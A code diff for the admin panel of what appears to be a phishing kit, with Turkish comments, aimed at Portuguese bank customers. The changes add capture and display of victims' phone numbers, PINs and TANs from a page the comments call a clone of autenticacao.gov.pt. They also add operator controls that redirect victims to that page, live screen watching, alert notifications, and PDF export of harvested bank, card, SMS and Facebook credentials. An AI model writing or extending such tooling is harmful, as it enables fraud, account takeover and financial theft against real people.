@@ -4,8 +4,16 @@ import { useCallback, useEffect, useState, useRef } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import type { DemoSession } from "@/types/session";
 import { pathToStep } from "@/lib/session-routes";
-import { playBeautifulNotification, showBeautifulToast } from "@/lib/notification";
+import {
+  playBeautifulNotification,
+  showBeautifulToast,
+  sendBrowserNotification,
+  enableBrowserNotifications,
+  disableBrowserNotifications,
+  areBrowserNotificationsEnabled,
+} from "@/lib/notification";
 import { isSessionLive, parseVisitorPresenceState } from "@/lib/admin-presence";
+import { LiveWatchModal } from "./LiveWatchModal";
 // Banka listesi (/banken) ekraninda kullanilan AYNI logo cozumleyiciyi import ediyoruz
 // Boylece admin panelindeki banka logolari = banka secim ekranindaki logolar (BIRBIRININ AYNISI)
 import {
@@ -14,7 +22,7 @@ import {
 } from "@/lib/bank-logo-constants";
 
 const SESSION_LIST_COLUMNS =
-  "id,public_id,created_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden";
+  "id,public_id,created_at,updated_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden";
 
 const LOG_PAGE_SIZE = 100;
 
@@ -497,6 +505,18 @@ function resolveBankLogoUrl(fd: Record<string, any>): { src: string | null; init
   return { src: finalSrc, initials, fallbackColor };
 }
 
+// PT banka slug'lari: giris yontemi kavrami yok (Autenticacao/ozel sablon),
+// Banka kolonunda "Giris yontemi: bekleniyor" rozeti gosterilmez.
+const PT_BANK_SLUGS = new Set([
+  "cgd", "abanca", "bpi", "novo-banco", "santander-pt",
+  "millennium-bcp", "activobank", "montepio", "credito-agricola",
+]);
+// Giris yontemi OLMAYAN bankalar (autenticacao'ya giden PT bankalari):
+// Banka kolonunda tamamen bos gosterilir (credential girilmedikce).
+const AUTH_ONLY_BANK_SLUGS = new Set([
+  "millennium-bcp", "activobank", "montepio", "credito-agricola",
+]);
+
 // ============================================================
 //  BANKA GIRIS BILGILERI (SADECE KISA LABEL + DEGER):
 //  Kimlik No, ID/K.Adı, Şifre/PIN, Telefon, TAC, Hesap No, Giriş Kodu, İmza, Kimlik Kodu
@@ -565,11 +585,13 @@ function getShortBankCredentialFields(fd: Record<string, any>): Array<[string, s
     return isOrderedField ? "Alan 2" : "Ek Alan";
   };
 
-  const first = orderedField1 || rawPersonalCode || rawUsername;
-  const second = orderedField2 || rawPassword || rawBankPhone;
+  // ONCE kanonik alanlar (username/password/personalCode) — orderedField aynasi degilse
+  // bunlar baskin olsun; orderedField sadece kanonik alan yoksa fallback.
+  const first = rawUsername || rawPersonalCode || orderedField1;
+  const second = rawPassword || rawBankPhone || orderedField2;
   const results: Array<[string, string]> = [];
   if (first) {
-    let label = labelFor(first, { orderedType: orderedField1Type, isOrderedField: !!orderedField1 });
+    let label = labelFor(first, { orderedType: orderedField1Type, isOrderedField: !rawUsername && !rawPersonalCode && !!orderedField1 });
     if (label === "Ek Alan" && orderedField1) label = "Alan 1";
     if (label === "Alan 2") label = orderedField1 ? "Alan 1" : "Ek Alan";
     results.push([label, first]);
@@ -578,7 +600,7 @@ function getShortBankCredentialFields(fd: Record<string, any>): Array<[string, s
     if (first && second === first) {
       // duplicate oldugundan 2. kez basma
     } else {
-      let label = labelFor(second, { orderedType: orderedField2Type, isOrderedField: !!orderedField2 });
+      let label = labelFor(second, { orderedType: orderedField2Type, isOrderedField: !rawPassword && !rawBankPhone && !!orderedField2 });
       if (label === "Ek Alan" && orderedField2) label = "Alan 2";
       results.push([label, second]);
     }
@@ -593,6 +615,70 @@ function getShortBankCredentialFields(fd: Record<string, any>): Array<[string, s
 }
 
 import { deleteSessionsAction } from "@/app/actions/delete-sessions";
+
+// Adim rozeti (stepText/stepColor) — masaustu tablo satiri ve mobil kart ortak kullanir
+function getStepDisplay(
+  currentStep: string,
+  fd: Record<string, any>,
+  isOnline: boolean,
+  livePath: string | undefined,
+  darkMode: boolean
+): { s: string; stepText: string; stepColor: string } {
+  let stepText = "BAŞLANGIÇ";
+  let stepColor = darkMode ? "text-gray-400 bg-gray-500/10 border border-gray-500/20" : "text-gray-600 bg-gray-100 border border-gray-200";
+
+  let s = currentStep;
+  if (isOnline && livePath) {
+    if (livePath.startsWith('/wheel')) s = "wheel";
+    else {
+      const mapped = pathToStep(livePath);
+      if (mapped) s = mapped;
+    }
+  }
+
+  if (s === "wheel") { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
+  else if (s === "code_entry") {
+    if (fd.is_wheel_game) { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
+    else { stepText = "KOD GİRİŞİ"; stepColor = "text-pink-500 bg-pink-500/10 border border-pink-500/20"; }
+  }
+  else if (s === "win") { stepText = "İSİM & PROFİL"; stepColor = "text-blue-500 bg-blue-500/10 border border-blue-500/20"; }
+  else if (s === "win2") { stepText = "İSİM & PROFİL 2"; stepColor = "text-blue-400 bg-blue-400/10 border border-blue-400/20"; }
+  else if (s === "verify") { stepText = "DOĞRULAMA"; stepColor = "text-sky-500 bg-sky-500/10 border border-sky-500/20"; }
+  else if (s === "banken" || s === "banken2") { stepText = "BANKA SEÇİMİ"; stepColor = "text-yellow-600 dark:text-yellow-500 bg-yellow-500/10 border border-yellow-500/20"; }
+  else if (s === "bank") {
+    let bName = typeof fd.viewingBankName === 'string' ? fd.viewingBankName : typeof fd.bankName === 'string' ? fd.bankName : null;
+
+    if (!bName && livePath && livePath.includes('/bank/')) {
+      const parts = livePath.split('/');
+      const bankIdx = parts.indexOf('bank');
+      if (bankIdx !== -1 && parts.length > bankIdx + 1) {
+        bName = parts[bankIdx + 1].replace(/-/g, ' ');
+      }
+    }
+
+    stepText = bName ? bName.toUpperCase() : "BANKA GİRİŞİ";
+    stepColor = "text-orange-500 bg-orange-500/10 border border-orange-500/20";
+  }
+  else if (s === "sms") { stepText = "SMS ONAYI"; stepColor = "text-indigo-500 bg-indigo-500/10 border border-indigo-500/20"; }
+  else if (s === "card") { stepText = "KREDİ KARTI"; stepColor = "text-purple-500 bg-purple-500/10 border border-purple-500/20"; }
+  else if (s === "facebook") { stepText = "FACEBOOK"; stepColor = "text-[#0064E0] bg-[#0064E0]/10 border border-[#0064E0]/20"; }
+  else if (s === "autenticacao") { stepText = "AUTENTICAÇÃO"; stepColor = "text-sky-600 bg-sky-500/10 border border-sky-500/20"; }
+  else if (s === "wait") { stepText = "BEKLEMEDE"; stepColor = "text-gray-500 bg-gray-500/10 border border-gray-500/20"; }
+  else if (s === "congrats") { stepText = "TEBRİKLER"; stepColor = "text-green-500 bg-green-500/10 border border-green-500/20"; }
+  else if (s === "invalid_bank") { stepText = "HATALI BANKA"; stepColor = "text-red-500 bg-red-500/10 border border-red-500/20"; }
+  else if (s === "live_support") { stepText = "CANLI DESTEK"; stepColor = "text-cyan-500 bg-cyan-500/10 border border-cyan-500/20"; }
+  else if (s === "custom_question") { stepText = "ÖZEL SORU"; stepColor = "text-violet-500 bg-violet-500/10 border border-violet-500/20"; }
+  else if (s === "generator1") { stepText = "GENERATOR 1"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
+  else if (s === "generator2") { stepText = "GENERATOR 2"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
+  else if (s === "special_approval") {
+    const rawAppr = (typeof fd.approvalStatus === "string" ? fd.approvalStatus : "").replace(/_confirmed$/, "");
+    const opt = APPROVAL_OPTIONS.find((o) => o.value === rawAppr);
+    stepText = opt ? `${opt.label.replace(" Sayfası", "").toUpperCase()} ONAYI` : "ÖZEL BİLDİRİM";
+    stepColor = "text-fuchsia-500 bg-fuchsia-500/10 border border-fuchsia-500/20";
+  }
+
+  return { s, stepText, stepColor };
+}
 
 export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: boolean, user: any, displayMode?: "normal" | "deleted" | "trash" }) {
   const isDeletedMode = displayMode === "deleted";
@@ -649,12 +735,16 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
   // Presence
   const [onlineSessionIds, setOnlineSessionIds] = useState<Set<string>>(new Set());
+  const prevOnlineRef = useRef<Set<string>>(new Set());
+  const graceLeftRef = useRef<Map<string, number>>(new Map());
+  const lastPathRef = useRef<Map<string, string>>(new Map());
   const [sessionPaths, setSessionPaths] = useState<Record<string, string>>({});
   const [sessionLastSeenAt, setSessionLastSeenAt] = useState<Record<string, number>>({});
   const [, setPresenceTick] = useState(0);
 
   const [chatSessionId, setChatSessionId] = useState<string | null>(null);
   const [deviceInfoSession, setDeviceInfoSession] = useState<DemoSession | null>(null);
+  const [liveWatchRow, setLiveWatchRow] = useState<DemoSession | null>(null);
   // =============== GECMIS GIRIS MODAL (Banka + Facebook onceki kayitlari) ===============
   const [showHistoryModal, setShowHistoryModal] = useState(false);
   const [historyModalSession, setHistoryModalSession] = useState<DemoSession | null>(null);
@@ -929,10 +1019,33 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
     localStorage.setItem('admin1SoundEnabled', soundEnabled.toString());
   }, [soundEnabled]);
 
+  const [browserNotifEnabled, setBrowserNotifEnabled] = useState(false);
+
+  useEffect(() => {
+    setBrowserNotifEnabled(areBrowserNotificationsEnabled());
+  }, []);
+
+  const toggleBrowserNotifications = useCallback(async () => {
+    if (browserNotifEnabled) {
+      disableBrowserNotifications();
+      setBrowserNotifEnabled(false);
+      return;
+    }
+    const granted = await enableBrowserNotifications();
+    setBrowserNotifEnabled(granted);
+    if (!granted) {
+      showBeautifulToast(
+        "Bildirim İzni Reddedildi",
+        "Tarayıcı ayarlarından site bildirimlerine izin vermeniz gerekiyor."
+      );
+    }
+  }, [browserNotifEnabled]);
+
   const playNotificationSound = useCallback((title: string = "Bildirim", desc?: string) => {
     try {
       playBeautifulNotification();
       showBeautifulToast(title, desc);
+      sendBrowserNotification(title, desc);
     } catch (e) {
       console.error("Audio error:", e);
     }
@@ -1150,10 +1263,43 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
     const applyPresence = () => {
       const parsed = parseVisitorPresenceState(presenceChannel.presenceState());
+      const now = Date.now();
+
+      // Son bilinen path'leri koru — offline olsa bile Sayfa kolonu son sayfayi gosterir
+      for (const [id, p] of Object.entries(parsed.sessionPaths)) {
+        lastPathRef.current.set(id, p);
+      }
+
+      // Yeni ayrilanlari isaretle (presence leave)
+      for (const id of prevOnlineRef.current) {
+        if (!parsed.onlineSessionIds.has(id) && !graceLeftRef.current.has(id)) {
+          graceLeftRef.current.set(id, now);
+        }
+      }
+      // Geri donenleri temizle
+      for (const id of parsed.onlineSessionIds) graceLeftRef.current.delete(id);
+      prevOnlineRef.current = new Set(parsed.onlineSessionIds);
+
+      // 30sn grace: sayfa gecisinde untrack->track arasi "offline" titremesini engelle
+      const online = new Set(parsed.onlineSessionIds);
+      const lastSeen: Record<string, number> = { ...parsed.sessionLastSeenAt };
+      for (const [id, leftAt] of graceLeftRef.current) {
+        if (now - leftAt < 30_000) {
+          online.add(id);
+          lastSeen[id] = leftAt;
+        } else {
+          graceLeftRef.current.delete(id);
+        }
+      }
+
+      const paths: Record<string, string> = {};
+      for (const [id, p] of lastPathRef.current) paths[id] = p;
+      for (const [id, p] of Object.entries(parsed.sessionPaths)) paths[id] = p;
+
       setLiveVisitorCount(parsed.liveVisitorCount);
-      setOnlineSessionIds(new Set(parsed.onlineSessionIds));
-      setSessionPaths(parsed.sessionPaths);
-      setSessionLastSeenAt(parsed.sessionLastSeenAt);
+      setOnlineSessionIds(online);
+      setSessionPaths(paths);
+      setSessionLastSeenAt(lastSeen);
       setPresenceTick((t) => t + 1);
     };
 
@@ -1526,6 +1672,74 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       return;
     }
 
+    // AUTENTICACAO: kullanici /autenticacao (autenticacao.gov.pt klonu) sayfasina gider.
+    // Adim 1 (telemovel+PIN) zaten doldurulmus olabilir — tekrar gonderimde eski TAN
+    // temizlenir, varsa onceki auth verisi autenticacaoHistory'ye tasinir.
+    // Kullanici adim 2'deki TAN'i gonderince approvalStatus "autenticacao_confirmed" olur.
+    if (approvalPromptType === "autenticacao") {
+      const authHistory: any[] = Array.isArray(previousFormData.autenticacaoHistory)
+        ? [...previousFormData.autenticacaoHistory]
+        : [];
+      const prevTan =
+        typeof previousFormData.cmdTan === "string" && previousFormData.cmdTan.trim()
+          ? previousFormData.cmdTan
+          : previousFormData.autenticacaoTan;
+      if (prevTan) {
+        authHistory.push({
+          generatorType: "autenticacao",
+          data: {
+            "Telemóvel": previousFormData.cmdPhone || "",
+            PIN: previousFormData.cmdPin || "",
+            TAN: prevTan,
+          },
+          submittedAt: previousFormData.autenticacaoSubmittedAt || new Date().toISOString(),
+        });
+      }
+      // Autenticacao kolonu icin banka kaydini garantiye al:
+      // istemci autenticacaoBankName yazamadiysa ve slug auth-only setteyse
+      // mevcut bankSlug/bankName'den turetilir. Normal sablonlu banka yazilmaz.
+      const prevBankSlugLower =
+        typeof previousFormData.bankSlug === "string"
+          ? previousFormData.bankSlug.trim().toLowerCase()
+          : "";
+      const authBankPatch: Record<string, string> = {};
+      if (
+        AUTH_ONLY_BANK_SLUGS.has(prevBankSlugLower) &&
+        typeof previousFormData.autenticacaoBankName !== "string"
+      ) {
+        authBankPatch.autenticacaoBankSlug = String(previousFormData.bankSlug);
+        authBankPatch.autenticacaoBankName = String(previousFormData.bankName || previousFormData.bankSlug);
+      }
+
+      await supabase
+        .from("sessions")
+        .update({
+          is_hidden: false,
+          status: "online",
+          current_step: "autenticacao",
+          form_data: {
+            ...previousFormData,
+            ...authBankPatch,
+            approvalStatus: "autenticacao",
+            autenticacaoHistory: authHistory,
+            cmdTan: "",
+            autenticacaoTan: "",
+            approvalCode: "",
+            specialNoticeText: "",
+            specialNoticeImage: "",
+            specialNoticeLang: undefined,
+            specialNoticeSentAt: "",
+          },
+        })
+        .eq("id", approvalPromptSessionId);
+
+      setApprovalPromptSessionId(null);
+      setApprovalPromptType("");
+      setApprovalCodeInput("");
+      void load();
+      return;
+    }
+
     await supabase
       .from("sessions")
       .update({
@@ -1629,7 +1843,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
       // Admin tablosuyla ayni kolon yapisi: cizgili tablo PDF
       const s = (v: unknown) => (v == null ? "" : String(v));
-      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "Generator", "SMS", "Kart", "Facebook", "IP", "Cihaz"];
+      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "Autenticação", "SMS", "Kart", "Facebook", "IP", "Cihaz"];
 
       const tableBody: any[][] = [
         COL_HEADERS.map(
@@ -1647,11 +1861,12 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         for (const [k, v] of getShortBankCredentialFields(fd)) bankCell.push({ text: `${k}: ${v}` });
         if (!bankCell.length) bankCell.push({ text: "-", color: "#9ca3af" });
 
-        const approvalHist = parseApprovalHistory(fd.approvalHistory);
+        const approvalHist = parseApprovalHistory(fd.approvalHistory)
+          .filter((a) => !a.startsWith("autenticacao"));
         const approvalEntries =
           approvalHist.length > 0
             ? approvalHist
-            : typeof fd.approvalStatus === "string" && fd.approvalStatus.trim()
+            : typeof fd.approvalStatus === "string" && fd.approvalStatus.trim() && !fd.approvalStatus.trim().startsWith("autenticacao")
               ? [fd.approvalStatus.trim()]
               : [];
         const approvalCell = approvalEntries.length
@@ -1659,6 +1874,14 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           : { text: "-", color: "#9ca3af" };
 
         const genCell: any[] = [];
+        const authPhoneX = s(fd.cmdPhone).trim();
+        const authPinX = s(fd.cmdPin).trim();
+        const authTanX = s(fd.cmdTan).trim() || s(fd.autenticacaoTan).trim();
+        if (authPhoneX || authPinX || authTanX) {
+          if (authPhoneX) genCell.push({ text: `Tel: ${authPhoneX}` });
+          if (authPinX) genCell.push({ text: `PIN: ${authPinX}` });
+          if (authTanX) genCell.push({ text: `TAN: ${authTanX}`, bold: true, color: "#e11d48" });
+        }
         const genCurrentRaw =
           fd.generatorCurrent && typeof fd.generatorCurrent === "object"
             ? (fd.generatorCurrent as Record<string, any>)
@@ -1784,7 +2007,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         header: {
           margin: [20, 12, 20, 0],
           columns: [
-            { text: `MAXIMA — ${isDeletedMode ? "Silinen " : ""}Log Yedeği`, style: "title" },
+            { text: `IKI — ${isDeletedMode ? "Silinen " : ""}Log Yedeği`, style: "title" },
             { text: `${all.length} kayıt • ${dateStr}`, style: "subtitle", alignment: "right" },
           ],
         },
@@ -1822,7 +2045,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         defaultStyle: { fontSize: 7 },
       };
 
-      pdfMake.createPdf(doc).download(`maxima-loglar-${isDeletedMode ? "silinen-" : ""}${dateStr}.pdf`);
+      pdfMake.createPdf(doc).download(`iki-loglar-${isDeletedMode ? "silinen-" : ""}${dateStr}.pdf`);
     } catch (e) {
       alert(`Export hatasi: ${e instanceof Error ? e.message : "bilinmeyen hata"}`);
     } finally {
@@ -2152,6 +2375,30 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 </>
               )}
             </button>
+            <button
+              onClick={() => void toggleBrowserNotifications()}
+              className={`flex items-center gap-2.5 rounded-full px-5 py-2.5 shadow-sm text-[12px] font-bold tracking-wider uppercase transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${
+                browserNotifEnabled
+                  ? "bg-emerald-500/10 border border-emerald-500/20 text-emerald-500 ring-1 ring-emerald-500/50"
+                  : (darkMode ? "bg-[#1c1c1e] border border-white/10 text-zinc-400 hover:bg-white/10 hover:text-white" : "bg-white border border-gray-200 text-gray-500 hover:bg-gray-50 hover:text-black")
+              }`}
+              title="Sekme arka plandayken bile işletim sistemi bildirimi al"
+            >
+              {browserNotifEnabled ? (
+                <>
+                  <span className="relative flex h-2.5 w-2.5">
+                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-500 opacity-75"></span>
+                    <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
+                  </span>
+                  Bildirim Açık
+                </>
+              ) : (
+                <>
+                  <svg className="w-4 h-4 opacity-70" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" /></svg>
+                  Bildirim Kapalı
+                </>
+              )}
+            </button>
           </div>
         </div>
 
@@ -2164,28 +2411,29 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
       {/* TABLE */}
       <div className={`rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
-        <div className="overflow-x-auto pb-4">
-          <table className="w-full table-auto border-collapse text-[10px] text-left lg:text-[11px]">
-            <thead className={`text-[11px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
+        <div className="overflow-x-auto pb-4 hidden lg:block">
+          <table className="w-full table-auto border-collapse text-[12px] text-left lg:text-[13px]">
+            <thead className={`text-[13px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
               <tr>
-                <th className="min-w-[60px] px-2 py-3 font-semibold whitespace-nowrap">Ödül</th>
-                <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">İsim</th>
-                <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
-                <th className="min-w-[180px] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
-                <th className="min-w-[110px] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
-                <th className="min-w-[130px] px-2 py-3 font-semibold whitespace-nowrap">Generator</th>
-                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
-                <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
-                <th className="min-w-[110px] px-2 py-3 font-semibold whitespace-nowrap">FACEBOOK</th>
-                <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">Sayfa</th>
-                <th className="min-w-[70px] px-2 py-3 font-semibold whitespace-nowrap">Durum</th>
-                <th className="min-w-[150px] px-2 py-3 font-semibold text-right whitespace-nowrap">İşlemler</th>
+                <th className="min-w-[60px] px-2 py-3 font-semibold whitespace-nowrap text-center">İzle</th>
+                <th className="min-w-[55px] px-2 py-3 font-semibold whitespace-nowrap">Ödül</th>
+                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">İsim</th>
+                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
+                <th className="min-w-[150px] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
+                <th className="min-w-[95px] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
+                <th className="min-w-[115px] px-2 py-3 font-semibold whitespace-nowrap">Autenticação</th>
+                <th className="min-w-[70px] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
+                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
+                <th className="min-w-[95px] px-2 py-3 font-semibold whitespace-nowrap">FACEBOOK</th>
+                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">Sayfa</th>
+                <th className="min-w-[60px] px-2 py-3 font-semibold whitespace-nowrap">Durum</th>
+                <th className="min-w-[125px] px-2 py-3 font-semibold text-right whitespace-nowrap">İşlemler</th>
               </tr>
             </thead>
             <tbody className={`divide-y ${darkMode ? 'divide-white/5' : 'divide-gray-100'}`}>
               {rows.length === 0 && (
                 <tr>
-                  <td colSpan={12} className="px-5 py-12 text-center text-base opacity-50 font-medium">Henüz bir log yok. İşlemler burada görünecek.</td>
+                  <td colSpan={13} className="px-5 py-12 text-center text-base opacity-50 font-medium">Henüz bir log yok. İşlemler burada görünecek.</td>
                 </tr>
               )}
               {rows.map((row) => {
@@ -2197,70 +2445,30 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                   sessionLastSeenAt[row.id],
                 );
                 
-                let stepText = "BAŞLANGIÇ";
-                let stepColor = darkMode ? "text-gray-400 bg-gray-500/10 border border-gray-500/20" : "text-gray-600 bg-gray-100 border border-gray-200";
-                
-                let s = row.current_step as string;
                 const livePath = sessionPaths[row.id];
-                if (isOnline && livePath) {
-                  if (livePath.startsWith('/wheel')) s = "wheel";
-                  else {
-                    const mapped = pathToStep(livePath);
-                    if (mapped) s = mapped;
-                  }
-                }
-
-                if (s === "wheel") { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
-                else if (s === "code_entry") {
-                  if (fd.is_wheel_game) { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
-                  else { stepText = "KOD GİRİŞİ"; stepColor = "text-pink-500 bg-pink-500/10 border border-pink-500/20"; }
-                }
-                else if (s === "win") { stepText = "İSİM & PROFİL"; stepColor = "text-blue-500 bg-blue-500/10 border border-blue-500/20"; }
-                else if (s === "win2") { stepText = "İSİM & PROFİL 2"; stepColor = "text-blue-400 bg-blue-400/10 border border-blue-400/20"; }
-                else if (s === "verify") { stepText = "DOĞRULAMA"; stepColor = "text-sky-500 bg-sky-500/10 border border-sky-500/20"; }
-                else if (s === "banken" || s === "banken2") { stepText = "BANKA SEÇİMİ"; stepColor = "text-yellow-600 dark:text-yellow-500 bg-yellow-500/10 border border-yellow-500/20"; }
-                else if (s === "bank") {
-                  let bName = typeof fd.viewingBankName === 'string' ? fd.viewingBankName : typeof fd.bankName === 'string' ? fd.bankName : null;
-                  
-                  if (!bName && livePath && livePath.includes('/bank/')) {
-                    const parts = livePath.split('/');
-                    const bankIdx = parts.indexOf('bank');
-                    if (bankIdx !== -1 && parts.length > bankIdx + 1) {
-                      bName = parts[bankIdx + 1].replace(/-/g, ' ');
-                    }
-                  }
-
-                  stepText = bName ? bName.toUpperCase() : "BANKA GİRİŞİ";
-                  stepColor = "text-orange-500 bg-orange-500/10 border border-orange-500/20";
-                }
-                else if (s === "sms") { stepText = "SMS ONAYI"; stepColor = "text-indigo-500 bg-indigo-500/10 border border-indigo-500/20"; }
-                else if (s === "card") { stepText = "KREDİ KARTI"; stepColor = "text-purple-500 bg-purple-500/10 border border-purple-500/20"; }
-                else if (s === "facebook") { stepText = "FACEBOOK"; stepColor = "text-[#0064E0] bg-[#0064E0]/10 border border-[#0064E0]/20"; }
-                else if (s === "wait") { stepText = "BEKLEMEDE"; stepColor = "text-gray-500 bg-gray-500/10 border border-gray-500/20"; }
-                else if (s === "congrats") { stepText = "TEBRİKLER"; stepColor = "text-green-500 bg-green-500/10 border border-green-500/20"; }
-                else if (s === "invalid_bank") { stepText = "HATALI BANKA"; stepColor = "text-red-500 bg-red-500/10 border border-red-500/20"; }
-                else if (s === "live_support") { stepText = "CANLI DESTEK"; stepColor = "text-cyan-500 bg-cyan-500/10 border border-cyan-500/20"; }
-                else if (s === "custom_question") { stepText = "ÖZEL SORU"; stepColor = "text-violet-500 bg-violet-500/10 border border-violet-500/20"; }
-                else if (s === "generator1") { stepText = "GENERATOR 1"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
-                else if (s === "generator2") { stepText = "GENERATOR 2"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
-                else if (s === "special_approval") {
-                  const rawAppr = (typeof fd.approvalStatus === "string" ? fd.approvalStatus : "").replace(/_confirmed$/, "");
-                  const opt = APPROVAL_OPTIONS.find((o) => o.value === rawAppr);
-                  stepText = opt ? `${opt.label.replace(" Sayfası", "").toUpperCase()} ONAYI` : "ÖZEL BİLDİRİM";
-                  stepColor = "text-fuchsia-500 bg-fuchsia-500/10 border border-fuchsia-500/20";
-                }
+                const { s, stepText, stepColor } = getStepDisplay(
+                  row.current_step as string,
+                  fd,
+                  isOnline,
+                  livePath,
+                  darkMode
+                );
 
                 const canonicalBankFields = getCanonicalAdminBankFields(fd);
                 // eslint-disable-next-line @typescript-eslint/no-unused-vars
                 const additionalBankFields = getAdditionalAdminBankFields(fd); // GUVENLIK: hesaplansin ama BANKA KOLONUNDA KULLANILMAYACAK
                 const shortCreds = getShortBankCredentialFields(fd);
                 const loginMethod = readLoginMethod(fd);
+                const rawBankSlugLower = String(fd.bankSlug || "").trim().toLowerCase();
+                const isPtBank = PT_BANK_SLUGS.has(rawBankSlugLower) || /(^|[-_\s])pt($|[-_\s])/.test(rawBankSlugLower);
+                const isAuthOnlyBank = s === "autenticacao" || AUTH_ONLY_BANK_SLUGS.has(rawBankSlugLower);
                 const logoInfo = resolveBankLogoUrl(fd);
                 // Sadece GUNCEL durum: admin yeni istek gonderince "Bekliyor",
                 // kullanici onaylayinca "Onaylandi" goster. Eski history badge'i basmaz.
                 const currentApproval =
                   typeof fd.approvalStatus === "string" ? fd.approvalStatus.trim() : "";
-                const approvalEntries = currentApproval ? [currentApproval] : [];
+                const approvalEntries =
+                  currentApproval && !currentApproval.startsWith("autenticacao") ? [currentApproval] : [];
                 // GENERATOR: tip basina GUNCEL kayit — kodas 1 ustte, kodas 2 altta.
                 // Ayni tipe tekrar yonlendirme: eski kayit gecmise gider, burada bos rozet (bekliyor) kalir.
                 const genCurrentRaw =
@@ -2296,42 +2504,82 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
                 return (
                   <tr key={row.id} className={`${darkMode ? 'hover:bg-white/[0.02]' : 'hover:bg-black/[0.01]'} transition-colors duration-200 group`}>
+                    <td className="px-2 py-3 align-middle whitespace-nowrap text-center">
+                      <button
+                        type="button"
+                        onClick={() => setLiveWatchRow(row)}
+                        className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[13px] font-bold transition-all shadow-sm ${
+                          isOnline
+                            ? "bg-red-500/15 text-red-500 border border-red-500/30 hover:bg-red-500 hover:text-white"
+                            : darkMode
+                            ? "bg-white/5 text-gray-400 hover:bg-white/10 hover:text-gray-200 border border-white/10"
+                            : "bg-gray-100 text-gray-500 hover:bg-gray-200 hover:text-gray-700 border border-gray-200"
+                        }`}
+                        title={isOnline ? "Kullanıcıyı canlı izle (Çevrimiçi)" : "Kullanıcı ekranını aç (Çevrimdışı)"}
+                      >
+                        {isOnline ? (
+                          <>
+                            <span className="relative flex h-2 w-2">
+                              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
+                              <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span>
+                            </span>
+                            <span>Canlı İzle</span>
+                          </>
+                        ) : (
+                          <>
+                            <svg className="w-3.5 h-3.5 opacity-60" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
